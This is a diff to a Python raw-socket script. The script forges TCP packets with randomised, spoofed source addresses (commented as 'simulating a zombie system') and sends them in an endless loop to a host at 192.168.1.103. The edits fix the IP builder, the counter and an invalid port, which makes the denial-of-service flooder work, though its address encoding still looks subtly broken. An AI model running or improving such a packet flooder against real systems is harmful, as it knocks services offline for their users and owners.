@@ -7,11 +7,12 @@ def rip ():	# generating a random IP address '192.168.1.X'
 	octet1 = '\xC0'
 	octet2 = '\xA8'
 	octet3 = '\x01'
-	ip = b'{octet1} + {octet2} + {octet3} + {octet4}'
-	return ip
+	ip = octet1 + octet2 + octet3 + octet4
+	return ip.encode()
 
+number = 0
 while True:
-	number = 0
+
 	try:
 		tmp = rip()	# simulating a zombie system
 		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
@@ -30,7 +31,7 @@ while True:
 		tcp_header += b'\xe6\x32\x00\x00' # Checksum | Urgent Pointer
 
 		packet = ip_header + tcp_header
-		s.sendto(packet, ('192.168.1.103', 123457))
+		s.sendto(packet, ('192.168.1.103', 12347))
 		number += 1
 		print(f'sent packet from {tmp} ' + str(number))
 	except Exception:
